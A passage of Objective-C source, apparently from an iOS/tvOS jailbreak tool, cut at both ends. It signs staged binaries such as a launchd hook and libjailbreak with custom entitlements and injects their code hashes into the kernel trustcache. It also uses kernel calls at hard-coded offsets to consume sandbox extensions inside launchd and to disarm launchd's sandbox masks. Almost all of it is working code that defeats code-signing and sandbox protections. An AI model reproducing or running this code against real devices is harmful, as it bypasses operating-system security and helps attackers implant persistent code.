    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_INIT_OFFSETS_COUNT=%u",
        ctor_audit.init_offsets_count] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_LOGICAL_CONSTRUCTOR_COUNT=%u",
        ctor_count] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_CONSTRUCTOR_REPRESENTATION=%s",
        dt102732c_constructor_representation(&ctor_audit)] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_CONSTRUCTOR_VALIDATION=%@",
        ctor_valid ? @"PASS" : @"FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_DEP_GRAPH_CHECK=%@",
        pass ? @"PASS" : @"FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_MSHOOKFUNCTION_IMPORT_PRESENT=%@",
        mshook ? @"YES" : @"NO"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_INITXPCHOOKS_REFERENCE_PRESENT=%@",
        initxpc ? @"YES" : @"NO"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_FULL_HOOK_JBSERVER_PRESENT=%@",
        full_jbserver ? @"YES" : @"NO"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_MAIN_HOOK_CONSTRUCTOR_COUNT=%u",
        ctor_count] UTF8String]);
#ifdef DT_ROOTLESS_R4
    dt699_stage([[NSString stringWithFormat:@"ROOTLESS_R7_HOOK_DEP_GATE_%@",
        pass ? @"PASS" : @"FAIL"] UTF8String]);
#endif
    return pass ? 0 : -1;
}

static int dt102732c_sign_artifact(dt102732c_artifact_t *artifact, void (^log)(NSString *line))
{
    NSString *ent = [[NSBundle mainBundle].bundlePath
        stringByAppendingPathComponent:@"Handoff516/entitlements_launchdhook681.plist"];
    if (!artifact || !artifact->path.length || ![[NSFileManager defaultManager] fileExistsAtPath:artifact->path]
        || ![[NSFileManager defaultManager] fileExistsAtPath:ent]) {
        return -1;
    }

    NSString *preSha = dt699_sha256_path(artifact->path);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_%s_PRESIGN_SHA256=%@",
        artifact->name, preSha ?: @""] UTF8String]);

    uint8_t outPlatform = 0;
    dt_choma_sign_layout_report_t layoutReport = {0};
    int sr = dt_choma_platform_sign_staged_file(artifact->path.fileSystemRepresentation,
        ent.fileSystemRepresentation, artifact->identifier, 13, &outPlatform,
        artifact->cdhash, &layoutReport);
    if (sr != 0 || outPlatform != 13) {
        dt1025_log(log, @"[!] BUILD102732C sign failed name=%s rc=%d platform=%u",
            artifact->name, sr, (unsigned)outPlatform);
        return -2;
    }

    cdhash_t reparsed = {0};
    if (dt_macho_best_cdhash_from_path(artifact->path.fileSystemRepresentation, reparsed) != 0
        || memcmp(reparsed, artifact->cdhash, CS_CDHASH_LEN) != 0) {
        return -3;
    }
    NSString *postSha = dt699_sha256_path(artifact->path);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_%s_POSTSIGN_SHA256=%@",
        artifact->name, postSha ?: @""] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_%s_CDHASH=%@",
        artifact->name, dt_cdhash_hex_string(artifact->cdhash)] UTF8String]);
    return 0;
}

static int dt102732c_trust_trio(dt102732c_artifact_t *artifacts)
{
#if DT_BUILD_NUM == 102734 || DT_BUILD_NUM == 102736 || DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
#if DT_BUILD_NUM == 102738
    static const uuid_t kB102734CBatchTCUUID = {
        'T', 'V', 'O', 'S', '7', '3', '8', 'P',
        'T', 'C', '\0', '\0', '\0', '\0', '\0', '\0'
    };
#elif DT_BUILD_NUM == 102737
    static const uuid_t kB102734CBatchTCUUID = {
        'T', 'V', 'O', 'S', '7', '3', '7', 'D',
        'T', 'C', '\0', '\0', '\0', '\0', '\0', '\0'
    };
#elif DT_BUILD_NUM == 102736
    static const uuid_t kB102734CBatchTCUUID = {
        'T', 'V', 'O', 'S', '7', '3', '6', 'C',
        'T', 'C', '\0', '\0', '\0', '\0', '\0', '\0'
    };
#else
    static const uuid_t kB102734CBatchTCUUID = {
        'T', 'V', 'O', 'S', '7', '3', '4', 'C',
        'T', 'C', '\0', '\0', '\0', '\0', '\0', '\0'
    };
#endif
    NSString *bundleRoot = [[NSBundle mainBundle].bundlePath
        stringByAppendingPathComponent:@"Handoff516"];
    struct {
        const char *name;
        NSString *path;
        cdhash_t cdhash;
    } trust_items[5] = {
        { "JBCTL", [bundleRoot stringByAppendingPathComponent:@"dt_jbctl516"], {0} },
        { "OPAINJECT", [bundleRoot stringByAppendingPathComponent:@"dt_opainject516"], {0} },
        { "LAUNCHDHOOK", artifacts[0].path, {0} },
        { "LIBJAILBREAK", artifacts[1].path, {0} },
        { "LIBCHOMA", artifacts[2].path, {0} },
    };

    dt699_stage("BUILD102734C_TRUSTCACHE_BATCHED=YES");
#if DT_BUILD_NUM == 102736
    dt699_stage("BUILD102736C_TRUSTCACHE_BATCHED=YES");
    dt699_stage("BUILD102736C_HELPER_TRUST_INCLUDED=YES");
#elif DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    dt699_stage("BUILD102737D_TRUSTCACHE_BATCHED=YES");
    dt699_stage("BUILD102737D_HELPER_TRUST_INCLUDED=YES");
#if DT_BUILD_NUM == 102738
    dt699_stage("BUILD102738P_TRUSTCACHE_BATCHED=YES");
    dt699_stage("BUILD102738P_HELPER_TRUST_INCLUDED=YES");
#endif
#endif
    for (size_t i = 0; i < 5; i++) {
        if (!trust_items[i].path.length
            || dt_macho_best_cdhash_from_path(trust_items[i].path.fileSystemRepresentation,
                trust_items[i].cdhash) != 0) {
            dt699_stage([[NSString stringWithFormat:@"BUILD102734C_%s_CDHASH=UNAVAILABLE",
                trust_items[i].name] UTF8String]);
#if DT_BUILD_NUM == 102736
            dt699_stage([[NSString stringWithFormat:@"BUILD102736C_%s_CDHASH=UNAVAILABLE",
                trust_items[i].name] UTF8String]);
#elif DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
            dt699_stage([[NSString stringWithFormat:@"BUILD102737D_%s_CDHASH=UNAVAILABLE",
                trust_items[i].name] UTF8String]);
#if DT_BUILD_NUM == 102738
            dt699_stage([[NSString stringWithFormat:@"BUILD102738P_%s_CDHASH=UNAVAILABLE",
                trust_items[i].name] UTF8String]);
#endif
#endif
            dt699_stage("BUILD102734C_ALL_TRUST_VERIFY=FAIL");
#if DT_BUILD_NUM == 102736
            dt699_stage("BUILD102736C_ALL_TRUST_VERIFY=FAIL");
#elif DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
            dt699_stage("BUILD102737D_ALL_TRUST_VERIFY=FAIL");
#if DT_BUILD_NUM == 102738
            dt699_stage("BUILD102738P_ALL_TRUST_VERIFY=FAIL");
#endif
#endif
            return -1;
        }
        dt699_stage([[NSString stringWithFormat:@"BUILD102734C_%s_CDHASH=%@",
            trust_items[i].name, dt_cdhash_hex_string(trust_items[i].cdhash)] UTF8String]);
#if DT_BUILD_NUM == 102736
        dt699_stage([[NSString stringWithFormat:@"BUILD102736C_%s_CDHASH=%@",
            trust_items[i].name, dt_cdhash_hex_string(trust_items[i].cdhash)] UTF8String]);
#elif DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
        dt699_stage([[NSString stringWithFormat:@"BUILD102737D_%s_CDHASH=%@",
            trust_items[i].name, dt_cdhash_hex_string(trust_items[i].cdhash)] UTF8String]);
#if DT_BUILD_NUM == 102738
        dt699_stage([[NSString stringWithFormat:@"BUILD102738P_%s_CDHASH=%@",
            trust_items[i].name, dt_cdhash_hex_string(trust_items[i].cdhash)] UTF8String]);
#endif
#endif
    }

    cdhash_t unique[5];
    uint32_t uniqueCount = 0;
    for (size_t i = 0; i < 5; i++) {
        BOOL duplicate = NO;
        for (size_t j = 0; j < uniqueCount; j++) {
            if (memcmp(unique[j], trust_items[i].cdhash, CS_CDHASH_LEN) == 0) {
                duplicate = YES;
                break;
            }
        }
        if (!duplicate) {
            memcpy(unique[uniqueCount], trust_items[i].cdhash, CS_CDHASH_LEN);
            uniqueCount++;
        }
    }

    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_TRUSTCACHE_ENTRY_COUNT=%u",
        uniqueCount] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102734C_TRUSTCACHE_ENTRY_COUNT=%u",
        uniqueCount] UTF8String]);
#if DT_BUILD_NUM == 102736
    dt699_stage([[NSString stringWithFormat:@"BUILD102736C_TRUSTCACHE_ENTRY_COUNT=%u",
        uniqueCount] UTF8String]);
#elif DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_TRUSTCACHE_ENTRY_COUNT=%u",
        uniqueCount] UTF8String]);
#if DT_BUILD_NUM == 102738
    dt699_stage([[NSString stringWithFormat:@"BUILD102738P_TRUSTCACHE_ENTRY_COUNT=%u",
        uniqueCount] UTF8String]);
#endif
#endif
    dt699_stage("BUILD102732C_TRUSTCACHE_BATCHED=YES");
    uint32_t uploaded = 0;
    int upload_rc = dt_trustcache_upload_batch_cdhashes(unique, uniqueCount,
        kB102734CBatchTCUUID, &uploaded);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_TRUSTCACHE_UPLOAD_RC=%d",
        upload_rc] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102734C_TRUSTCACHE_UPLOAD_RC=%d",
        upload_rc] UTF8String]);
#if DT_BUILD_NUM == 102736
    dt699_stage([[NSString stringWithFormat:@"BUILD102736C_TRUSTCACHE_UPLOAD_RC=%d",
        upload_rc] UTF8String]);
#elif DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_TRUSTCACHE_UPLOAD_RC=%d",
        upload_rc] UTF8String]);
#if DT_BUILD_NUM == 102738
    dt699_stage([[NSString stringWithFormat:@"BUILD102738P_TRUSTCACHE_UPLOAD_RC=%d",
        upload_rc] UTF8String]);
#endif
#endif
    if (upload_rc != 0) {
        dt699_stage("BUILD102732C_ALL_TRUST_VERIFY=FAIL");
        dt699_stage("BUILD102734C_ALL_TRUST_VERIFY=FAIL");
#if DT_BUILD_NUM == 102736
        dt699_stage("BUILD102736C_ALL_TRUST_VERIFY=FAIL");
#elif DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
        dt699_stage("BUILD102737D_ALL_TRUST_VERIFY=FAIL");
#if DT_BUILD_NUM == 102738
        dt699_stage("BUILD102738P_ALL_TRUST_VERIFY=FAIL");
#endif
#endif
        return -2;
    }

    BOOL all = YES;
    for (size_t i = 0; i < 5; i++) {
        BOOL trusted = dt_cdhash_trustcached(trust_items[i].cdhash);
        NSString *trustedText = trusted ? @"YES" : @"NO";
        if (strcmp(trust_items[i].name, "JBCTL") == 0) {
            dt699_stage([[NSString stringWithFormat:@"BUILD102734C_JBCTL_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#if DT_BUILD_NUM == 102736
            dt699_stage([[NSString stringWithFormat:@"BUILD102736C_JBCTL_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#elif DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
            dt699_stage([[NSString stringWithFormat:@"BUILD102737D_JBCTL_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#if DT_BUILD_NUM == 102738
            dt699_stage([[NSString stringWithFormat:@"BUILD102738P_JBCTL_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#endif
#endif
        } else if (strcmp(trust_items[i].name, "OPAINJECT") == 0) {
            dt699_stage([[NSString stringWithFormat:@"BUILD102734C_OPAINJECT_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#if DT_BUILD_NUM == 102736
            dt699_stage([[NSString stringWithFormat:@"BUILD102736C_OPAINJECT_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#elif DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
            dt699_stage([[NSString stringWithFormat:@"BUILD102737D_OPAINJECT_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#if DT_BUILD_NUM == 102738
            dt699_stage([[NSString stringWithFormat:@"BUILD102738P_OPAINJECT_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#endif
#endif
        } else if (strcmp(trust_items[i].name, "LAUNCHDHOOK") == 0) {
            dt699_stage([[NSString stringWithFormat:@"BUILD102734C_LAUNCHDHOOK_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#if DT_BUILD_NUM == 102736
            dt699_stage([[NSString stringWithFormat:@"BUILD102736C_LAUNCHDHOOK_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#elif DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
            dt699_stage([[NSString stringWithFormat:@"BUILD102737D_LAUNCHDHOOK_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#if DT_BUILD_NUM == 102738
            dt699_stage([[NSString stringWithFormat:@"BUILD102738P_LAUNCHDHOOK_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#endif
#endif
        } else if (strcmp(trust_items[i].name, "LIBJAILBREAK") == 0) {
            dt699_stage([[NSString stringWithFormat:@"BUILD102734C_LIBJAILBREAK_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#if DT_BUILD_NUM == 102736
            dt699_stage([[NSString stringWithFormat:@"BUILD102736C_LIBJAILBREAK_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#elif DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
            dt699_stage([[NSString stringWithFormat:@"BUILD102737D_LIBJAILBREAK_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#if DT_BUILD_NUM == 102738
            dt699_stage([[NSString stringWithFormat:@"BUILD102738P_LIBJAILBREAK_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#endif
#endif
        } else if (strcmp(trust_items[i].name, "LIBCHOMA") == 0) {
            dt699_stage([[NSString stringWithFormat:@"BUILD102734C_LIBCHOMA_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#if DT_BUILD_NUM == 102736
            dt699_stage([[NSString stringWithFormat:@"BUILD102736C_LIBCHOMA_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#elif DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
            dt699_stage([[NSString stringWithFormat:@"BUILD102737D_LIBCHOMA_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#if DT_BUILD_NUM == 102738
            dt699_stage([[NSString stringWithFormat:@"BUILD102738P_LIBCHOMA_TRUSTCACHE_PRESENT=%@",
                trustedText] UTF8String]);
#endif
#endif
        }
        if (i >= 2) {
            dt699_stage([[NSString stringWithFormat:@"BUILD102732C_%s_TRUSTCACHE_PRESENT=%@",
                trust_items[i].name, trustedText] UTF8String]);
        }
        if (!trusted)
            all = NO;
    }
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_ALL_TRUST_VERIFY=%@",
        all ? @"PASS" : @"FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102734C_ALL_TRUST_VERIFY=%@",
        all ? @"PASS" : @"FAIL"] UTF8String]);
#if DT_BUILD_NUM == 102736
    dt699_stage([[NSString stringWithFormat:@"BUILD102736C_ALL_TRUST_VERIFY=%@",
        all ? @"PASS" : @"FAIL"] UTF8String]);
#elif DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_ALL_TRUST_VERIFY=%@",
        all ? @"PASS" : @"FAIL"] UTF8String]);
#if DT_BUILD_NUM == 102738
    dt699_stage([[NSString stringWithFormat:@"BUILD102738P_ALL_TRUST_VERIFY=%@",
        all ? @"PASS" : @"FAIL"] UTF8String]);
#endif
#endif
    return all ? 0 : -3;
#else
    static const uuid_t kB102732CBatchTCUUID = {
        'T', 'V', 'O', 'S', '7', '3', '2', 'C',
        'T', 'C', '\0', '\0', '\0', '\0', '\0', '\0'
    };
    cdhash_t hashes[3];
    for (size_t i = 0; i < 3; i++)
        memcpy(hashes[i], artifacts[i].cdhash, CS_CDHASH_LEN);

    dt699_stage("BUILD102732C_TRUSTCACHE_ENTRY_COUNT=3");
    dt699_stage("BUILD102732C_TRUSTCACHE_BATCHED=YES");
    uint32_t uploaded = 0;
    int upload_rc = dt_trustcache_upload_batch_cdhashes(hashes, 3, kB102732CBatchTCUUID, &uploaded);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_TRUSTCACHE_UPLOAD_RC=%d", upload_rc] UTF8String]);
    if (upload_rc != 0) {
        dt699_stage("BUILD102732C_ALL_TRUST_VERIFY=FAIL");
        return -1;
    }

    BOOL all = YES;
    for (size_t i = 0; i < 3; i++) {
        BOOL trusted = dt_cdhash_trustcached(artifacts[i].cdhash);
        dt699_stage([[NSString stringWithFormat:@"BUILD102732C_%s_TRUSTCACHE_PRESENT=%@",
            artifacts[i].name, trusted ? @"YES" : @"NO"] UTF8String]);
        if (!trusted)
            all = NO;
    }
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_ALL_TRUST_VERIFY=%@",
        all ? @"PASS" : @"FAIL"] UTF8String]);
    return all ? 0 : -2;
#endif
}

static int dt102732c_consume_artifact(uint64_t launchd_proc, dt102732c_artifact_t *artifact,
    void (^log)(NSString *line))
{
    char *read_token = dt1025_issue_token_path(kDTClassRead, artifact->path.fileSystemRepresentation, log);
    char *exec_token = dt1025_issue_token_path(kDTClassExec, artifact->path.fileSystemRepresentation, log);
    if (!read_token || !exec_token) {
        if (read_token)
            sandbox_extension_release(read_token);
        if (exec_token)
            sandbox_extension_release(exec_token);
        dt699_stage([[NSString stringWithFormat:@"BUILD102732C_WALL2_%s_AUTHORIZED=NO",
            artifact->auth_marker] UTF8String]);
        return -1;
    }

    int read_kern_ret = -1;
    int64_t read_handle = dt1025_kcall_consume_token(launchd_proc, read_token, log, &read_kern_ret);
    int exec_kern_ret = -1;
    int64_t exec_handle = dt1025_kcall_consume_token(launchd_proc, exec_token, log, &exec_kern_ret);
    sandbox_extension_release(read_token);
    sandbox_extension_release(exec_token);

    BOOL ok = read_kern_ret == 0 && read_handle != 0
        && exec_kern_ret == 0 && exec_handle != 0;
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_WALL2_%s_AUTHORIZED=%@",
        artifact->auth_marker, ok ? @"YES" : @"NO"] UTF8String]);
    return ok ? 0 : -2;
}

static int dt102732c_wall2_authorize_trio(dt102732c_artifact_t *artifacts,
    void (^log)(NSString *line), dt102732c_wall2_context_t *ctx)
{
    if (!ctx)
        return -1;
    memset(ctx, 0, sizeof(*ctx));
    dt699_stage("BUILD102732C_WALL2_TARGET_COUNT=3");

    if (dt1025_kcall_init(log) != 0)
        return -2;
    pid_t app_pid = getpid();
    uint64_t app_proc = proc_find(app_pid);
    BOOL app_proc_needs_rele = app_proc != 0;
    if (!app_proc)
        app_proc = dt_kfd_current_proc();
    NSString *calFail = nil;
    if (!app_proc || dt10252_run_calibration(app_proc, log, &calFail) != 0) {
        if (app_proc_needs_rele)
            proc_rele(app_proc);
        return -3;
    }
    if (app_proc_needs_rele)
        proc_rele(app_proc);

    uint64_t launchd_proc = proc_find(1);
    if (!launchd_proc)
        return -4;
    ctx->launchd_proc = launchd_proc;

    BOOL pointer_cal_ok = NO;
    NSString *ptrCalFail = nil;
    if (dt692_pointer_return_calibration(launchd_proc, log, &pointer_cal_ok, &ptrCalFail) != 0
        || !pointer_cal_ok) {
        return -5;
    }

    dt691_ro_zone_globals_t ro = {0};
    dt694_wall2_state_t post_apply = {0};
    dt694_wall2_state_t post_consume = {0};
    if (dt691_load_ro_zone_globals(&ro, log) != 0)
        return -6;
    if (dt694_capture_state(launchd_proc, &ro, &ctx->baseline, log) != 0
        || !dt694_baseline_coherent(&ctx->baseline, log)) {
        return -7;
    }

    dt_sandbox_apply_bundle_t bundle = {
        .name_ptr = (mach_vm_address_t)(uintptr_t)kDT604BuiltinProfileName,
        .ext_ptr = 0,
        .ext_len = 0,
    };
    int apply_kern_ret = -1;
    if (dt1025_kcall_53d540(launchd_proc, &bundle, log, &apply_kern_ret) != 0
        || apply_kern_ret != 0) {
        dt699_stage("BUILD102732C_WALL2_APPLY=FAIL");
        return -8;
    }
    ctx->active = YES;
    if (dt694_capture_state(launchd_proc, &ro, &post_apply, log) != 0
        || !dt694_post_apply_valid(&ctx->baseline, &post_apply, log)) {
        dt699_stage("BUILD102732C_WALL2_APPLY=FAIL");
        return -9;
    }

    /* 15:14 IPS: unix_syscall 6fb7b0 → 82CE04 → syscall-unix 36 SIGKILL while
     * 55106C consume still ran. 532CBC arms label+unix mask together. 55106C
     * uses 532C68 label only. Disarm unix/mach/MIG masks here; do not 532A80. */
    dt699_stage("BUILD102732C_WALL2_UNIX_MASK_DISARM_BEGIN");
    int mask_kern = -1;
    uint64_t profile_after_disarm = 0;
    if (dt688a_kcall_5329ac(launchd_proc, 0, log, &mask_kern) != 0 || mask_kern != 0) {
        dt699_stage("BUILD102732C_WALL2_UNIX_MASK_DISARM=FAIL");
        dt699_stage("BUILD102732C_WALL2_APPLY=FAIL");
        return -11;
    }
    if (dt688a_kcall_532c68(launchd_proc, log, &profile_after_disarm) != 0
        || profile_after_disarm == 0) {
        dt699_stage("BUILD102732C_WALL2_UNIX_MASK_DISARM=FAIL");
        dt699_stage("BUILD102732C_WALL2_APPLY=FAIL");
        return -12;
    }
    dt699_stage("BUILD102732C_WALL2_UNIX_MASK_DISARM=PASS");

    BOOL all = YES;
    for (size_t i = 0; i < 3; i++) {
        if (dt102732c_consume_artifact(launchd_proc, &artifacts[i], log) != 0)
            all = NO;
    }
    if (dt694_capture_state(launchd_proc, &ro, &post_consume, log) != 0)
        all = NO;
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_WALL2_APPLY=%@",
        all ? @"PASS" : @"FAIL"] UTF8String]);
    return all ? 0 : -10;
}

static int dt102732c_restore_wall2(dt102732c_wall2_context_t *ctx, void (^log)(NSString *line))
{
    if (!ctx || !ctx->active || !ctx->launchd_proc) {
        dt699_stage("BUILD102732C_WALL2_RESTORE_ATTEMPTED=NO");
        dt699_stage("BUILD102732C_WALL2_RESTORE_RESULT=FAIL");
        dt699_stage("BUILD102732C_FILTER_RESTORE_RESULT=NOT_ACTIVE");
        dt699_stage("BUILD102732C_ORIGINAL_STATE_RESTORED=NO");
#if DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
        dt699_stage("BUILD102737D_WALL2_RESTORE_ATTEMPTED=NO");
        dt699_stage("BUILD102737D_WALL2_RESTORE_RESULT=FAIL");
        dt699_stage("BUILD102737D_ORIGINAL_STATE_RESTORED=NO");
#if DT_BUILD_NUM == 102738
        dt699_stage("BUILD102738P_WALL2_RESTORE_ATTEMPTED=NO");
        dt699_stage("BUILD102738P_WALL2_RESTORE_RESULT=FAIL");
#endif
#endif
        return -1;
    }
    dt699_stage("BUILD102732C_WALL2_RESTORE_ATTEMPTED=YES");
    NSString *restoreResult = nil;
    BOOL stateMatch = NO;
    int rr = dt709_wall2_restore_launchd(ctx->launchd_proc, &ctx->baseline, log,
        &restoreResult, &stateMatch);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_WALL2_RESTORE_RESULT=%@",
        rr == 0 ? @"PASS" : @"FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_FILTER_RESTORE_RESULT=%@",
        restoreResult ?: @"FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102732C_ORIGINAL_STATE_RESTORED=%@",
        stateMatch ? @"YES" : @"NO"] UTF8String]);
#if DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    dt699_stage("BUILD102737D_WALL2_RESTORE_ATTEMPTED=YES");
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_WALL2_RESTORE_RESULT=%@",
        rr == 0 ? @"PASS" : @"FAIL"] UTF8String]);
    dt699_stage([[NSString stringWithFormat:@"BUILD102737D_ORIGINAL_STATE_RESTORED=%@",
        stateMatch ? @"YES" : @"NO"] UTF8String]);
#if DT_BUILD_NUM == 102738
    dt699_stage("BUILD102738P_WALL2_RESTORE_ATTEMPTED=YES");
    dt699_stage([[NSString stringWithFormat:@"BUILD102738P_WALL2_RESTORE_RESULT=%@",
        rr == 0 ? @"PASS" : @"FAIL"] UTF8String]);
#endif
#endif
    ctx->active = NO;
    return rr;
}

static void dt102732c_reemit_hook_capture(NSString *capture)
{
    if (!capture.length)
        return;
    for (NSString *line in [capture componentsSeparatedByString:@"\n"]) {
        if ([line hasPrefix:@"BUILD102732C_"] || [line hasPrefix:@"BUILD102734C_"]
            || [line hasPrefix:@"BUILD102736C_"]
            || [line hasPrefix:@"BUILD102737D_"]
            || [line hasPrefix:@"BUILD102738P_"]
            || [line hasPrefix:@"GATE1B_"])
            dt699_stage(line.UTF8String);
    }
}

#if DT_BUILD_NUM == 102735 || DT_BUILD_NUM == 102736 || DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
typedef struct {
    char basebin_path[PATH_MAX];
    char hook_path[PATH_MAX];
    char trace_path[PATH_MAX];
    char header[256];
    size_t header_len;
    dev_t dev;
    ino_t ino;
    mode_t mode;
    uid_t uid;
    gid_t gid;
    off_t size;
    time_t mtime;
    BOOL preexisted;
    BOOL path_under_preboot;
    BOOL path_under_var_jb;
    BOOL is_regular;
    BOOL header_readback;
    BOOL preflight_pass;
    int clear_rc;
    int create_rc;
    int header_write_rc;
} dt102735d_trace_ctx_t;

typedef struct {
    BOOL trace_present;
    BOOL inode_matches;
    BOOL trace_fresh;
    BOOL hook_append_observed;
    BOOL constructor_entered;
    BOOL primitives_init_pass;
    BOOL boomerang_done_send_pass;
    BOOL ctor_return_pass;
    BOOL ctor_return_fail;
    BOOL ctor_exit_reached;
    BOOL got_probe_entered;
    BOOL got_probe_terminal_pass;
    BOOL got_probe_terminal_fail;
    BOOL got_restore_pass;
    BOOL got_restore_fatal;
    BOOL got_pointer_unchanged;
    BOOL got_prestore_match;
    BOOL got_same_value_store_pass;
    BOOL got_wrapper_store_pass;
    BOOL got_original_restore_pass;
    BOOL got_wrapper_roundtrip_pass;
    BOOL got_wrapper_invoked_pass;
    BOOL got_wrapper_invocation_proof_pass;
    BOOL got_wrapper_persistent_install_pass;
    uint64_t got_wrapper_invocation_count_before;
    uint64_t got_wrapper_invocation_count_after;
    BOOL terminal_observed;
    NSTimeInterval hook_terminal_timestamp;
    NSTimeInterval observation_begin_timestamp;
    NSTimeInterval observation_timeout_timestamp;
    BOOL pte_client_reply_received;
    BOOL pte_client_reply_decoded;
    BOOL pte_client_asid_ptr_valid;
    int pte_client_result_value;
    uint64_t pte_client_asid_ptr;
    int boomerang_wait_rc;
    off_t next_offset;
    char last_event[96];
    char last_confirmed_stage[96];
    char actual_stop_point[128];
    char failure_result[128];
} dt102735d_trace_observation_t;

static const char *dt102735d_yesno(BOOL v)
{
    return v ? "YES" : "NO";
}

static BOOL dt102735d_path_has_prefix_component(NSString *path, NSString *prefix)
{
    if (!path.length || !prefix.length)
        return NO;
    return [path isEqualToString:prefix] || [path hasPrefix:[prefix stringByAppendingString:@"/"]];
}

static int dt102735d_write_all(int fd, const uint8_t *bytes, size_t len)
{
    size_t off = 0;
    while (off < len) {
        ssize_t wrote = write(fd, bytes + off, len - off);
        if (wrote <= 0)
            return errno ? -errno : -1;
        off += (size_t)wrote;
    }
    return 0;
}

static void dt102735d_copy_string(char *dst, size_t dst_len, NSString *src)
{
    if (!dst || dst_len == 0)
        return;
    const char *s = src.length ? src.fileSystemRepresentation : "";
    strlcpy(dst, s ?: "", dst_len);
}

static void dt102735d_copy_cstr(char *dst, size_t dst_len, const char *src)
{
    if (!dst || dst_len == 0)
        return;
    strlcpy(dst, src ?: "", dst_len);
}

static NSData *dt102735d_read_regular_file(const char *path, struct stat *st_out, int *rc_out)
{
    if (rc_out)
        *rc_out = -EINVAL;
    if (!path || !path[0])
        return nil;

    int fd = open(path, O_RDONLY | O_CLOEXEC | O_NOFOLLOW);
    if (fd < 0) {
        if (rc_out)
            *rc_out = -errno;
        return nil;
    }

    struct stat st;
    if (fstat(fd, &st) != 0 || !S_ISREG(st.st_mode)) {
        int rc = errno ? -errno : -EINVAL;
        close(fd);
        if (rc_out)
            *rc_out = rc;
        return nil;
    }
    if (st_out)
        *st_out = st;

    NSMutableData *data = [NSMutableData data];
    uint8_t buf[4096];
    while (true) {
        ssize_t n = read(fd, buf, sizeof(buf));
        if (n < 0) {
            int rc = -errno;
            close(fd);
            if (rc_out)
                *rc_out = rc;
            return nil;
        }
        if (n == 0)
            break;
        [data appendBytes:buf length:(NSUInteger)n];
    }
    close(fd);
    if (rc_out)
        *rc_out = 0;
    return data;
}

static int dt102735d_trace_preflight(dt102735d_trace_ctx_t *ctx, void (^log)(NSString *line))
{
    (void)log;
    if (!ctx)
        return -1;
    memset(ctx, 0, sizeof(*ctx));
    ctx->clear_rc = -9999;
    ctx->create_rc = -9999;
    ctx->header_write_rc = -9999;

    NSString *basebin = dt710_resolve_basebin_path();
    NSString *hook = dt710_resolve_hook_path();
#if DT_BUILD_NUM == 102737 || DT_BUILD_NUM == 102738
    NSString *trace = [basebin stringByAppendingPathComponent:@".dt102737_constructor_trace"];
    const char *traceBuild =
#if DT_BUILD_NUM == 102738
        "102738";
#else
        "102737";
#endif
#else
